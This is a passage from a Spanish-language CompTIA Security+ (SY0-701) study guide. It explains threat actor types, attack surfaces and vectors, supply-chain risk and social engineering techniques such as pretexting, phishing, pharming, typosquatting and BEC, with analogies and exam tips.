- **Estado nación:** Usa interrupción de servicio, exfiltración de datos o desinformación como arma de guerra (sin necesidad de estado bélico oficial)
- **Espionaje:** Exfiltración de datos para conocer secretos (no para venderlos, sino para obtener ventaja estratégica)
- **Espionaje comercial:** Una empresa roba secretos de un competidor

> **👉 Enfoque de Examen SY0-701:**
> Distingue **chantaje** (amenaza de revelar algo) vs **extorsión** (amenaza de continuar un ataque). El ransomware es **extorsión**, no chantaje. Otra combinación vigilar: el espionaje siempre es **exfiltración de datos + motivación política/estratégica**. CompTIA pregunta con frecuencia sobre la relación motivación → estrategia → tríada CIA. Memoriza: Desinformación = Integridad; Exfiltración = Confidencialidad; DoS = Disponibilidad.


### 2.1.4 Hackers y Hacktivistas

> **Analogía del mundo real:** "Hacker" es como "cirujano": originalmente un término neutral de habilidad. Un cirujano puede operar para salvar vidas (sombrero blanco) o para dañar (sombrero negro). La habilidad es la misma; la autorización y la intención cambian todo.

#### Tipos de Hackers

| Tipo | Terminología Antigua | Terminología Actual | Descripción |
|---|---|---|---|
| **Hacker ético / Autorizado** | White hat | **Autorizado** | Siempre busca autorización para hacer pentests. Opera dentro de límites legales. |
| **Hacker malicioso** | Black hat | **No autorizado** | Intrusiones ilegales o maliciosas |
| **Hacker oportunista** | Grey hat | — | Entre ambos extremos |

**Atacante sin formación (Script Kiddie)**

- Usa herramientas de hackers **sin comprender** cómo funcionan
- No puede crear nuevos ataques
- Motivación: llamar la atención, demostrar habilidades técnicas básicas
- **Sin objetivo específico ni propósito fundado**

**Equipos de hackers**

- El "hacker solitario" sigue siendo una amenaza, pero los ataques modernos son más frecuentemente **grupales**
- El esfuerzo colaborativo permite desarrollar herramientas sofisticadas y estrategias novedosas

**Hacktivistas**

- Grupos que usan herramientas cibernéticas para promover **una agenda política**
- Tácticas: exfiltración de datos para divulgación pública, ataques DoS, defacement de sitios web
- Objetivos frecuentes: organizaciones políticas, financieras, medios de comunicación
- También atacan empresas de diversos sectores (defensa del medio ambiente, derechos animales)

> **👉 Enfoque de Examen SY0-701:**
> CompTIA ya no usa los términos "white hat / black hat" en el examen SY0-701; usa **"autorizado / no autorizado"**. Un distractor común: presentar a un hacktivista como motivado financieramente (incorrecto, su motivación es política/ideológica). Los script kiddies tienen **baja sofisticación y bajos recursos** pero pueden causar daño real usando herramientas de terceros.

### 2.1.5 Actores de Estados Nación

**APT (Advanced Persistent Threat — Amenaza Persistente Avanzada)**
- **Acuñado** para describir adversarios cibernéticos modernos patrocinados por Estados
- No se trata de un virus puntual: se refiere a la **capacidad de comprometer continuamente la seguridad de una red** (obtener Y mantener acceso)
- Utiliza una **variedad de herramientas y técnicas**, no una sola
- El informe **APT1 de Mandiant** (sobre unidades chinas de espionaje cibernético) fue fundamental para configurar el lenguaje moderno sobre APTs

**Características de los Actores de Estados Nación**

- Objetivos principales: **sistemas de energía, salud y electorales**
- Motivaciones: **desinformación y espionaje** para obtener ventajas estratégicas
- Algunos países (ej. **Corea del Norte**) también atacan para obtener **beneficios financieros**
- Operan con **"negación plausible"**: trabajan a distancia del gobierno que los patrocina
- Pueden hacerse pasar por grupos independientes o **hacktivistas**
- Pueden perpetrar **campañas de desinformación de bandera falsa** para implicar a otros estados

**Recursos de Investigación**

- **The MITRE Corporation** reporta sobre actividades de crimen organizado y actores de tipo Estado nación
- Framework **ATT&CK** de MITRE: catálogo de TTPs (Tácticas, Técnicas y Procedimientos) de adversarios reales

> **Analogía del mundo real:** Imagina que un gobierno entrena a sus mejores espías, les da acceso ilimitado a recursos y tecnología, y les dice que operen en secreto sin que nadie pueda probar su origen. Eso es un actor de Estado nación en el ciberespacio.

> **👉 Enfoque de Examen SY0-701:**
> APT es un concepto muy preguntado. Recuerda: APT no es un malware específico, es un **estilo de ataque persistente y continuo**. La "negación plausible" significa que los actores estatales operan de manera que el gobierno patrocinador pueda negar su involucración. Distractor: confundir APT con ransomware (el ransomware puede ser parte de un ataque APT, pero no lo define). MITRE ATT&CK puede aparecer en preguntas sobre inteligencia de amenazas (threat intelligence).

### 2.1.6 Crimen Organizado y Competidores

#### Crimen Organizado

- En muchos países, la **delincuencia cibernética superó a la física** en número de incidentes y pérdidas
- Ventaja del cibercrimen: opera desde una **jurisdicción diferente** a la de su víctima → aumenta la complejidad judicial
- Actividades típicas:
  - **Fraude financiero** (a particulares y empresas)
  - **Chantaje / Extorsión**
- Aprovechan cualquier oportunidad de beneficio económico

#### Espionaje Comercial (Competidores)

- Aunque la mayoría del espionaje lo llevan a cabo actores estatales, una **empresa deshonesta** puede usar ciberespionaje contra competidores
- Objetivos: robo de propiedad intelectual, interrupción de la actividad del competidor, daño a su reputación
- **Vector facilitador:** empleados que cambian recientemente de empresa y aportan información privilegiada

> **👉 Enfoque de Examen SY0-701:**
> En escenarios sobre crimen organizado, las respuestas correctas casi siempre involucran motivación **financiera** (fraude, extorsión, chantaje). El espionaje comercial combina motivación **financiera + estratégica**. Diferencia clave: el crimen organizado es oportunista EN SU SELECCIÓN de víctimas, pero muy sofisticado en sus MÉTODOS.

### 2.1.7 Actores de Amenazas Internos

> **Analogía del mundo real:** El guardia de seguridad de un banco ya tiene acceso a la bóveda. No necesita "robarle" el acceso a nadie. Un insider es igual: ya está dentro del castillo y conoce los pasillos.

#### Clasificación de Amenazas Internas

| Tipo | Descripción |
|---|---|
| **Empleados (privilegios permanentes)** | Acceso continuo y legítimo al sistema |
| **Contratistas / Invitados (privilegios temporales)** | Acceso limitado en tiempo y alcance |
| **Ex-empleados** | Caso difuso: pueden tener **permisos residuales** si no se aplican controles de salida efectivos |

#### Por Intencionalidad

| Tipo | Características |
|---|---|
| **Malicioso** | Motivaciones: **venganza** y **ganancia financiera**. Puede ser dirigido (planificado) u oportunista |
| **No intencional / Inadvertido** | Falta de conciencia o negligencia (ej. mala gestión de contraseñas) |

#### Conceptos Importantes

**Denunciante (Whistleblower)**

- Persona con motivación **ética** para divulgar información confidencial
- Las revelaciones protegidas (ej. denunciar fraude financiero por canal autorizado) **NO pueden ser amenazadas ni punidas**

**TI en la sombra (Shadow IT)**

- Usuarios que adquieren o introducen hardware/software **sin autorización del departamento de TI**
- Agravado por: proliferación de servicios cloud y dispositivos móviles
- Consecuencia: **nueva superficie de ataque no monitoreada** que explotan adversarios maliciosos

**Colaboración Insider-Externo**

- Evalúa siempre si una amenaza interna puede estar **trabajando en colaboración con un actor externo**

> **👉 Enfoque de Examen SY0-701:**
> CompTIA distingue entre amenaza interna **maliciosa** vs **inadvertida**. La Shadow IT es un ejemplo clave de amenaza interna NO maliciosa. Pregunta trampa: "¿Un ex-empleado despedido con acceso residual es amenaza interna o externa?" → Depende del contexto, pero en el examen suele ser **interna con conocimiento interno** si mantiene acceso activo. Los denunciantes aparecen en preguntas de ética y política de seguridad, no como amenazas que deban bloquearse cuando actúan por canales protegidos.

## 2.2 Superficies de Ataque

> **Objetivo:** Comprender los métodos por los que los actores de amenazas se infiltran en redes y sistemas, para implementar controles que bloqueen los vectores de ataque.

### 2.2.1 Superficie de Ataque y Vectores de Amenaza

**Superficie de Ataque (Attack Surface)**
- Todos los puntos donde un actor de amenaza malicioso **podría intentar explotar una vulnerabilidad**
- Incluye: puertos de red, aplicaciones, computadoras, usuarios
- **Minimizar la superficie de ataque** = restringir el acceso a solo los puntos de conexión, protocolos/puertos y servicios necesarios

**Vectores de Amenaza y Ataque**
- **Vector de amenaza / Vector de ataque:** La ruta que usa un actor de amenaza para ejecutar un ataque
- Se consideran sinónimos; algunas fuentes distinguen:
  - **Vector de amenaza:** análisis de la superficie de ataque *potencial*
  - **Vector de ataque:** análisis de un exploit que se ejecutó *con éxito*

> **Analogía del mundo real:** La superficie de ataque es como todos los puntos de entrada de una fortaleza: puertas, ventanas, túneles, murallas. Minimizar la superficie de ataque equivale a tapiar las ventanas que no se usan y reducir las puertas a solo las imprescindibles, con guardias en cada una.

#### Tipos de Superficies de Ataque

| Alcance | Ejemplos |
|---|---|
| **Global (toda la organización)** | Red pública, servidores expuestos, empleados, cadena de suministro |
| **Específico (un sistema)** | Un servidor individual, una aplicación web, las cuentas de empleados |

#### Características de los Ataques Sofisticados

- Los actores sofisticados utilizan **múltiples vectores simultáneos o secuenciales**
- Planifican **campañas en varias etapas** (no ataques únicos de "destrozar y agarrar")
- Los actores altamente capacitados pueden **desarrollar vectores novedosos** (desconocidos para el defensor)
- El conocimiento del actor sobre la superficie de ataque de tu organización puede ser **mejor que el tuyo propio**

```
Actor Externo: superficie de ataque MENOR (sin acceso legítimo)
Actor Interno: superficie de ataque MAYOR (acceso concedido)
```

> **👉 Enfoque de Examen SY0-701:**
> La superficie de ataque se puede evaluar a distintos niveles (organizacional, de sistema, de aplicación). CompTIA pregunta qué acción REDUCE la superficie de ataque: deshabilitar servicios innecesarios, cerrar puertos no usados, aplicar el principio de mínimo privilegio. Distinción clave: vector de amenaza vs vector de ataque (potencial vs ejecutado).

### 2.2.2 Vectores de Software Vulnerable

**Software Vulnerable**

- Contiene una falla en su **código o diseño** que puede aprovecharse para:
  - Eludir el control de acceso
  - Bloquear el proceso (DoS)
- Las vulnerabilidades generalmente solo se explotan en **circunstancias bastante específicas**
- Los proveedores suelen corregirlas rápidamente con parches, pero la complejidad del software moderno garantiza que casi ningún software esté libre de ellas

**Impacto del Software Vulnerable**

| Ejemplo | Vector de Acceso | Impacto Potencial |
|---|---|---|
| Vulnerabilidad en Adobe PDF Reader | Estación de trabajo del usuario | Punto de apoyo en red corporativa |
| Vulnerabilidad en software de servidor TLS | Servidor web | Compromiso de claves criptográficas para servicios HTTPS |

**Reducción de la Superficie de Ataque por Software**
- **Consolidar** productos → menos software = menos vulnerabilidades
- Asegurar la **misma versión** de un producto en toda la organización

> **Analogía del mundo real:** Un software vulnerable es como un edificio con una ventana rota. No todos los ladrones saben que está rota (requiere reconocimiento), y no todos pueden alcanzarla (requiere condiciones específicas), pero quien sí lo sabe y puede llegar, tiene entrada libre.

#### Sistemas y Aplicaciones No Compatibles (End-of-Life / EOL)

- Sistema **no compatible (EOL):** el proveedor ya NO desarrolla actualizaciones ni parches
- Son **extremadamente vulnerables** a exploits porque no recibirán corrección
- Estrategia de mitigación: **aislar** la aplicación no compatible de otros sistemas
  - Esto reduce las oportunidades de acceso del actor de amenaza
  - Es un ejemplo de **control compensatorio** (sustituto del parcheo)

#### Escaneo de Vulnerabilidades: Basado en Cliente vs. Sin Agente

| Tipo | Descripción | Quién lo usa |
|---|---|---|
| **Basado en cliente (Agent-based)** | Agente instalado en cada host; reporta a servidor de gestión | Equipos de seguridad internos |
| **Sin agente (Agentless)** | Escanea el host sin instalación; técnicas de red | Actores de amenazas en reconocimiento Y equipos de seguridad |

> ⚠️ Los actores de amenazas también utilizan herramientas de escaneo para el **reconocimiento** del objetivo.

> **👉 Enfoque de Examen SY0-701:**
> EOL/EOS (End of Life / End of Support) es un tema muy frecuente. CompTIA pregunta cuál es la MEJOR respuesta cuando no puedes parchear un sistema EOL: la respuesta es **aislarlo** (control compensatorio), NO simplemente documentarlo ni ignorarlo. El escaneo sin agente aparece en preguntas sobre reconocimiento de actores de amenazas. Diferencia entre "sin parche" (patch disponible pero no aplicado) vs "sin soporte" (no existe parche).

### 2.2.3 Vectores de Red

> **Analogía del mundo real:** Una red insegura es como una ciudad sin puertas ni muros. Cualquiera puede caminar por las calles (espionaje), poner un policía falso que redirija el tráfico (ataque en ruta) o cortar el suministro de agua (DoS).

#### Clasificación de Exploits: Remoto vs. Local

| Tipo | Definición | Requisito |
|---|---|---|
| **Remoto** | Se explota enviando código a través de una red | **No** requiere sesión autenticada |
| **Local** | El código debe ejecutarse desde una sesión autenticada | Requiere credenciales válidas o secuestro de sesión |

#### Redes No Seguras: Impacto en la Tríada CIA

| Falla | Tipo de Ataque | También Conocido Como |
|---|---|---|
| **Falta de Confidencialidad** | Espionaje del tráfico de red; recuperación de contraseñas e info confidencial | **Ataques de espionaje (Eavesdropping)** |
| **Falta de Integridad** | Conexión de dispositivos no autorizados; interceptación y modificación del tráfico; servicios falsificados | **Ataques en ruta (On-path attacks)** |
| **Falta de Disponibilidad** | Interrupción del servicio | **Ataques DoS (Denial of Service — Denegación de Servicio)** |

**Red Segura:** usa un marco de **control de acceso** + **soluciones criptográficas** para identificar, autenticar, autorizar y auditar usuarios, hosts y tráfico.

#### Vectores de Red Específicos

| Vector | Descripción |
|---|---|
| **Acceso directo (físico)** | Actor accede físicamente al sitio: estación de trabajo desbloqueada, disco de arranque, robo de hardware |
| **Red cableada** | Actor conecta dispositivo no autorizado a puerto de red física → permite espionaje, ataques en ruta y DoS |
| **Red remota / inalámbrica** | Obtiene credenciales de acceso remoto/WiFi, rompe protocolos de autenticación, o falsifica punto de acceso para recolección de credenciales |
| **Acceso a la nube** | Busca cuenta/servicio/host con credenciales débiles; ataca cuentas de desarrollo/administración cloud; puede atacar al **CSP (Cloud Service Provider — Proveedor de Servicios en la Nube)** |
| **Red Bluetooth** | Explota vulnerabilidad o mala configuración para transmitir archivo malicioso vía Bluetooth (protocolo WPAN) |
| **Credenciales predeterminadas** | El dispositivo/aplicación usa la contraseña de fábrica; fácil de descubrir en documentación del producto |
| **Puerto de servicio abierto** | Conexión no autenticada a puerto `TCP` o `UDP`; el software que escucha puede ser vulnerable a exploit o DoS |

#### Principio de Reducción de la Superficie de Red

```
❌ NO: Permitir tráfico en TODOS los puertos
✅ SÍ: Solo los puertos NECESARIOS para servicios autorizados
+ Diseño seguro + Cortafuegos + Detección de intrusiones + Control de acceso
```

> **👉 Enfoque de Examen SY0-701:**
> La distinción **remoto vs. local** es crítica para preguntas sobre gestión de vulnerabilidades (una vulnerabilidad remota es más severa que una local porque no requiere autenticación previa). On-path attack (antiguamente "man-in-the-middle") afecta a la **Integridad**. Los puertos abiertos innecesarios son el ejemplo clásico de superficie de ataque que debe reducirse. Distractor: "ataque de espionaje" → falla de **confidencialidad**, NO de integridad.

### 2.2.4 Vectores Basados en Señuelos

Un **señuelo** es algo superficialmente atractivo que, cuando el objetivo lo abre o interactúa con él, ejecuta una **carga maliciosa** que da al actor de amenaza control sobre el sistema o realiza una interrupción del servicio.

Los señuelos se usan cuando el actor de amenaza **no puede ejecutar un exploit directamente** de forma remota o local.

> **Analogía del mundo real:** Un señuelo es como un anzuelo con cebo: parece comida deliciosa para el pez, pero tiene un gancho oculto. El archivo adjunto parece útil o divertido, pero al abrirlo, ejecutas código malicioso.

#### Tipos de Señuelos

| Tipo | Descripción | Detalle |
|---|---|---|
| **Dispositivo extraíble (USB)** | Malware oculto en unidad USB o tarjeta de memoria | Solo conectar puede ejecutar el malware en algunos exploits |
| **Ataque de caída (Drop attack)** | Actor deja USB infectadas en oficinas, recepción o estacionamientos | Espera que al menos un empleado las conecte |
| **Archivo ejecutable** | Código de exploit oculto en programa (ej. **Trojan Horse — Troyano**) | Parece software gratuito, útil o divertido; crea backdoor para el actor |
| **Archivos de documento** | Código malicioso incrustado en Word, PDF | Aprovecha funciones de scripting o vulnerabilidades del visor |
| **Archivos de imagen** | Código de exploit dentro de imagen | Ataca vulnerabilidad en navegador o software de edición |

#### Reducción de la Superficie de Ataque por Señuelos

Requiere **gestión efectiva de seguridad de endpoints**, incluyendo:
- Gestión de vulnerabilidades
- Antivirus / Antimalware
- Control de ejecución de programas (whitelisting)
- Detección de intrusiones en endpoints

> **👉 Enfoque de Examen SY0-701:**
> El "drop attack" (ataque de caída de USB) es un escenario clásico de ingeniería social física que aparece frecuentemente. El Troyano (Trojan Horse) es el ejemplo paradigmático de señuelo de archivo ejecutable: parece legítimo pero crea un backdoor. Distractor: confundir troyano con virus (un virus se replica; un troyano no se replica, simplemente se disfraza). La superfice de ataque de señuelos es amplia porque incluye TODOS los dispositivos USB y TODO el software de visualización de documentos.

### 2.2.5 Vectores Basados en Mensajes

> **Analogía del mundo real:** Imagina que alguien te envía una carta que parece de tu banco, pidiendo que llames a un número de teléfono. La carta (mensaje) es el vector; el número falso es el señuelo. Los vectores de mensajes son los "carteros" que entregan los ataques.

#### Canales de Mensajería como Vectores de Amenaza

| Canal | Descripción | Vulnerabilidades específicas |
|---|---|---|
| **Correo electrónico** | Archivo adjunto malicioso + ingeniería social para que el usuario lo abra | El vector más clásico |
| **SMS (Servicio de Mensajes Cortos)** | Archivo o enlace enviado a dispositivo móvil vía protocolo **SS7 (Sistema de Señalización 7)** | SS7 tiene numerosas vulnerabilidades; la organización raramente tiene capacidad de monitoreo sobre SMS |
| **IM (Mensajería Instantánea)** | Reemplazos de SMS (WhatsApp, Telegram, etc.) en Windows/Android/iOS; admite adjuntos, voz, video | Cifrado puede dificultar análisis de amenazas por la organización |
| **Web y redes sociales** | Malware en adjuntos de publicaciones; descargas ocultas (drive-by downloads); apps troyano "imprescindibles" | El atacante compromete un sitio para infectar automáticamente navegadores vulnerables |

#### Conceptos Críticos

**Exploit de clic cero (Zero-click)**
- La mayoría de exploits requieren que el usuario **abra deliberadamente** el archivo
- **Clic cero:** simplemente **recibir** un archivo adjunto o **ver** una imagen en una página web activa el exploit automáticamente → máxima peligrosidad

**Vector de voz como ingeniería social**
- Un actor de amenaza puede usar vectores de mensajes para persuadir a un usuario a:
  - **Revelar una contraseña**
  - **Debilitar la configuración de seguridad**
- Puede perpetrarse simplemente con **una llamada de voz** (sin necesidad de malware)

> **👉 Enfoque de Examen SY0-701:**
> El protocolo SS7 aparece en preguntas sobre vulnerabilidades de SMS/móvil. Los exploits de "clic cero" son el escenario de mayor severidad: no requieren acción del usuario. Diferencia clave: el canal (SMS, email, IM) es el **vector**; el archivo adjunto malicioso es el **señuelo**. Pregunta trampa: "¿Qué hace que los ataques de IM sean difíciles de detectar?" → El **cifrado** de extremo a extremo impide que la organización analice el contenido.

### 2.2.6 Superficie de Ataque de la Cadena de Suministro

Un **ataque de cadena de suministro** consiste en infiltrarse en el objetivo a través de empresas en su cadena de suministro, en lugar de atacar directamente al objetivo.

**Ejemplo célebre:** La filtración de datos de **Target** se realizó a través de credenciales del **proveedor de sistemas de construcción** de la empresa.

```
┌─────────────────┐       ┌─────────────────┐       ┌─────────────────┐
│    FABRICANTE   ├──────►│   DISTRIBUIDOR  ├──────►│ EMPRESA CLIENTE │
│ (Código/Chips)  │       │(Logística/Venta)│       │ (Objetivo Real) │
└────────┬────────┘       └─────────────────┘       └────────▲────────┘
         │                                                   │
         └───────── Infiltración y código troyanizado ───────┘
```

> **Analogía del mundo real:** Para envenenar a toda una ciudad, no necesitas ir casa por casa. Envenas el suministro de agua en la fuente. La cadena de suministro es ese suministro de agua: comprometer a UN proveedor puede dar acceso a MILES de organizaciones objetivo.

#### Gestión de Adquisiciones (Acquisition Management)

El proceso de garantizar fuentes confiables de equipos y software.

| Tipo de Relación | Descripción |
|---|---|
| **Proveedor mayorista** | Obtiene productos del fabricante para venderlos a empresas (**B2B — Business to Business**) |
| **Proveedor minorista** | Obtiene de mayoristas; vende a empresas (B2B) o clientes finales (**B2C — Business to Consumer**); puede agregar personalización y soporte |
| **Socio comercial** | Relación estrecha con objetivos y marketing alineados; ej. **OEM (Original Equipment Manufacturer — Fabricante de Equipos Originales)** |

#### La Amplitud de la Cadena de Suministro

Para que una placa madre sea confiable, TODOS estos eslabones deben ser confiables:

```
Fabricante del chip
      ↓
Desarrollador del firmware
      ↓
Revendedor OEM
      ↓
Empresa de reparto
      ↓
Personal administrativo que entrega el equipo al usuario final
```

Cualquier persona con tiempo y recursos para **modificar el firmware** podría crear un **backdoor**. Aplica a hardware, software y servicios de red.

#### MSP (Managed Service Provider — Proveedor de Servicios Administrados)

- Proporciona y admite recursos de TI (redes, seguridad, infraestructura web) de forma subcontratada
- **Ventaja:** Más barato o más confiable que gestionar TI internamente
- **Riesgo de seguridad:**
  - Difícil de monitorear
  - Los empleados del MSP son **fuentes potenciales de amenazas internas**

#### Mejores Prácticas

- Para la mayoría de empresas: usar **proveedores de renombre** es el mejor esfuerzo práctico
- Gobierno, servicios militares y grandes empresas: mayor escrutinio sobre la cadena
- **Especial cuidado con máquinas de segunda mano** (pueden contener firmware modificado)
- Establecer cadena confiable = **negar a actores maliciosos tiempo y recursos para modificar activos suministrados**

> **👉 Enfoque de Examen SY0-701:**
> El ataque a Target a través del proveedor HVAC es el caso de estudio paradigmático de Supply Chain Attack. CompTIA puede presentar escenarios donde la amenaza no viene del objetivo directo sino de un tercero de confianza. MSP como amenaza interna es una combinación frecuente. Términos a recordar: B2B, B2C, OEM, MSP. La gestión de adquisiciones es la defensa principal contra ataques de cadena de suministro.

## 2.3 Ingeniería Social

La **ingeniería social** se refiere a los medios para:
- Obtener **información** de alguien
- Lograr que alguien **realice alguna acción** para el actor de amenaza

También conocida como: **"hackear al ser humano"**

```
┌────────────────────────────────────────────────────────┐
│        PRINCIPIOS PSICOLÓGICOS DE INGENIERÍA SOCIAL    │
└───────────────────────────┬────────────────────────────┘
                            │
      ┌───────────┬─────────┼───────────┬───────────┐
      ▼           ▼         ▼           ▼           ▼
┌───────────┐┌─────────┐┌───────┐┌─────────────┐┌───────┐
│ AUTORIDAD ││URGENCIA ││ESCASEZ││CONSENSOS/PR.││FAMIL. │
│           ││         ││       ││   SOCIAL    ││ /LIK. │
└───────────┘└─────────┘└───────┘└─────────────┘└───────┘
```

1. **Autoridad:** El atacante se presenta como una figura de poder (CEO, auditor, soporte técnico). Las personas tienden a seguir instrucciones de autoridades sin cuestionarlas.
2. **Urgencia:** Se induce estrés exigiendo una acción inmediata bajo amenaza de consecuencias graves. El estrés reduce el pensamiento analítico y fuerza decisiones apresuradas.
3. **Escasez:** Se ofrece un beneficio supuestamente exclusivo a punto de agotarse, forzando al usuario a saltarse los procesos de verificación por miedo a perder la oportunidad.
4. **Consenso / Prueba Social:** El atacante simula que otros compañeros ya han realizado la acción solicitada, validando el comportamiento como normal.
5. **Familiaridad / Simpatía:** Las personas cooperan más con quienes les caen bien. Los atacantes establecen relaciones previas para ganarse la confianza antes del ataque.
6. **Confianza:** El atacante construye credibilidad demostrando conocer información interna obtenida mediante reconocimiento OSINT.
7. **Intimidación:** Uso de amenazas o asertividad extrema para forzar a la víctima a saltarse los protocolos de seguridad.

> Las personas (empleados, contratistas, proveedores, clientes) son el **vector humano**: la superficie de ataque más difícil de parchear.

### 2.3.1 Vectores Humanos

> **Analogía del mundo real:** Un castillo puede tener las mejores murallas y fosos del mundo, pero si alguien convence al guardia de abrir la puerta de atrás, todas esas defensas no sirven de nada. La ingeniería social no ataca los sistemas, ataca a las personas que los operan.

#### Usos de la Ingeniería Social

| Fase | Objetivo | Ejemplo |
|---|---|---|
| **Reconocimiento** | Recopilar inteligencia previa a la intrusión | Obtener nombres de empleados, teléfonos, estructura organizacional |
| **Intrusión** | Efectuar el ataque directamente | Obtener credenciales, persuadir al usuario para ejecutar malware |

#### Escenarios de Ejemplo del PDF

**Escenario 1 — Engaño por correo:**
Actor envía archivo ejecutable que solicita contraseña → pretexto: "hay problemas de inicio de sesión esta mañana" → usuario ingresa credenciales → actor las captura.

**Escenario 2 — Suplantación telefónica:**
Actor llama al soporte técnico haciéndose pasar por representante de ventas remoto → obtiene dirección del servidor de acceso remoto, credenciales, números de teléfono del sistema privado de voz.

**Escenario 3 — Ingeniería social física:**
Actor activa alarma de incendio → aprovecha la confusión de la evacuación → entra al edificio y conecta dispositivo de monitoreo a un puerto de red.

> **👉 Enfoque de Examen SY0-701:**
> La ingeniería social explota debilidades **humanas**, no técnicas. CompTIA presenta escenarios y pide identificar el tipo de ataque. Los vectores humanos NO son solo digitales: incluyen ataques físicos como el del escenario 3. La ingeniería social puede preceder a un ataque técnico (reconocimiento) o SER el ataque en sí mismo (obtención de credenciales sin ningún exploit técnico).

### 2.3.2 Suplantación y Pretexting

#### Suplantación (Impersonation)

- **Definición:** Pretender ser otra persona
- Es posible cuando el objetivo **no puede verificar la identidad** del atacante (por teléfono, email)

**Dos enfoques del atacante:**

| Enfoque | Descripción |
|---|---|
| **Persuasivo / Consenso / Agrado** | Convence al objetivo de que rechazar sería descortés o "extraño" |
| **Coercitivo / Amenaza / Urgencia** | Intimida con apelación falsa a la autoridad o penalización (ej. "serás despedido si no actúas ahora") |

**Ejemplo clásico:** El ingeniero social llama a un departamento, afirma que necesita ajustar algo de forma remota, y logra que el usuario revele su contraseña.

#### Pretexting

- **Definición:** Uso de una **historia cuidadosamente elaborada** con detalles convincentes o intimidantes para hacer la suplantación más creíble
- Para ser convincente, el atacante necesita **información privilegiada** sobre la organización (nombres, puestos, teléfonos, facturas, órdenes de compra)
- Esta información parece **inocua** pero permite penetrar mediante suplantación
- La mayoría de empresas están más orientadas al **servicio al cliente** que a la seguridad → esta información suele ser fácil de conseguir

```
Reconocimiento → Recopilación de info → Construcción del pretexto → Suplantación convincente
```

> **👉 Enfoque de Examen SY0-701:**
> Suplantación e impersonation son lo mismo. **Pretexting** es la historia que hace creíble la suplantación. La urgencia y la autoridad son los dos disparadores psicológicos más usados en ingeniería social (aparecen en muchas preguntas). Distractor: confundir pretexting con phishing. El pretexting es la HISTORIA elaborada; el phishing es el VECTOR (normalmente email) que usa esa historia.

### 2.3.3 Phishing y Pharming

> **Analogía del mundo real:** 
> **Phishing:** Como pescar con caña: lanzas el anzuelo (email falso) a muchos peces y esperas que alguno pique.
> **Pharming:** Como envenenar el río para que todos los peces naden hacia donde tú quieres: manipulas el "mapa de Internet" para redirigir a las víctimas sin que lo noten.

#### Phishing (Suplantación de Identidad)

- **Combinación:** Ingeniería social + suplantación de identidad
- **Vector tradicional:** Correo electrónico
- **Objetivo:** Persuadir o engañar al usuario para que interactúe con un recurso malicioso disfrazado de confiable

**Dos modalidades principales:**
1. Convencer al usuario de **instalar malware** o permitir **acceso remoto**
2. Redirigir a un **sitio web falsificado** que imita banco o e-commerce → capturar credenciales cuando el usuario se autentica

#### Variantes de Phishing por Canal

| Variante | Canal | Descripción |
|---|---|---|
| **Phishing** | Email / SMS | Base estándar |
| **Vishing** | Voz (teléfono / VoIP) | Actor llama fingiendo ser el banco; solicita verificación de transacción; más difícil de rechazar que un email |
| **Smishing** | SMS (Short Message Service) | Phishing por mensajes de texto |
| **Angler Phishing** | Redes sociales | Vector de ingeniería social en plataformas sociales |

> ⚠️ La tecnología **deep fake** (voz e imagen sintética) hará más frecuentes los intentos de vishing con mensajes de voz e incluso video en el futuro.

#### Pharming (Redireccionamiento)

- **Definición:** Redirige a los usuarios de un sitio web **legítimo** a uno **malicioso**
- **Diferencia clave con phishing:** No usa ingeniería social; en cambio, **daña la resolución de nombres de Internet** de la víctima
- Resultado: el usuario escribe la URL correcta pero es redirigido al sitio malicioso

```
NORMAL:    mybank.foo → IP 2.2.2.2 (legítimo)
PHARMING:  mybank.foo → IP 6.6.6.6 (malicioso) ← DNS envenenado
```

> **👉 Enfoque de Examen SY0-701:**
> El examen distingue claramente phishing (engaño activo al usuario) vs pharming (manipulación del sistema de resolución DNS/nombres). El pharming no requiere que el usuario "muerda el anzuelo" de un correo; es transparente para él. Memoriza las variantes: Vishing (Voz), Smishing (SMS), Angler (redes sociales), Spear (dirigido). Las mejoras en deep fake como vector de vishing son un tema emergente en SY0-701.

### 2.3.4 Typosquatting

> **Analogía del mundo real:** Imagina que alguien abre una tienda llamada "McDonáld's" (con tilde) justo al lado de un McDonald's real, apostando a que algunos clientes distraídos entren al lugar equivocado.

#### Definición y Técnicas

**Typosquatting (Allanamiento de Error Tipográfico)**
- El actor de amenaza registra un **nombre de dominio muy similar** a uno real
- Espera que los usuarios no noten la diferencia y asuman que están en un sitio de confianza
- También conocidos como: **dominios primos**, **parecidos** o **doppelganger**

**Ejemplo:** `ejenplo.com` en lugar de `ejemplo.com`

#### Técnicas Relacionadas de Suplantación de Origen

| Técnica | Descripción |
|---|---|
| **Campo "De" falso en email** | El software de email puede mostrar un nombre diferente al remitente real. Menos efectivo hoy porque los filtros alertan sobre discrepancias. |
| **Typosquatting de dominio** | Registro de dominio con error ortográfico mínimo |
| **Subdominio secuestrado en nube** | Registro de subdominio usando dominio de proveedor cloud confiable, ej. `ejemplo.en`**`microsoft.com`** → muchos usuarios confiarán en él por ver "microsoft.com" |

> **👉 Enfoque de Examen SY0-701:**
> El typosquatting es una técnica de suplantación de **origen del mensaje**, no del mensaje en sí. CompTIA puede presentar un URL falsificado y preguntar qué técnica se está usando. El subdominio en un proveedor de nube confiable es el distractor más sofisticado: el dominio base (microsoft.com) es legítimo, pero el subdominio (ejemplo.en.microsoft.com) no lo es.

### 2.3.5 Compromiso de Correo Electrónico Empresarial (BEC)

> **Analogía del mundo real:** El phishing masivo es como pescar con red de arrastre: capturas lo que puedas. El BEC es como un francotirador: investiga, planifica, y apunta a UN objetivo específico de alto valor con munición personalizada.

#### BEC (Business Email Compromise — Compromiso de Correo Electrónico Empresarial)

- **Definición:** Campaña sofisticada dirigida a **una persona específica** dentro de una empresa (generalmente ejecutivo o alto directivo)
- El actor de amenaza se hace pasar por un **colega, socio comercial o proveedor**
- Realiza **reconocimiento extenso** para conocer el objetivo: enfoque psicológico óptimo y pretextos convincentes
- **No usa** características obvias de phishing masivo (links falsificados obvios, adjuntos de malware)
- Puede intentar primero **comprometer una cuenta de correo legítima** para enviar los mensajes de phishing desde ella

**Motivación típica:** Persuadir a un titular del presupuesto para que **autorice un pago fraudulento o transferencia bancaria**

#### Terminología de Ataques Altamente Dirigidos

| Término | Descripción |
|---|---|
| **Spear Phishing** | Phishing dirigido a **personas específicas** (no masivo) |
| **Whaling** | Phishing dirigido a **oficiales corporativos de alto nivel** (C-suite) |
| **CEO Fraud** | Suplantación del CEO para engañar a empleados |
| **Angler Phishing** | Uso de **redes sociales** como vector de phishing |
| **BEC** | Término amplio para campañas de email sofisticadas y dirigidas, frecuentemente con motivación financiera |

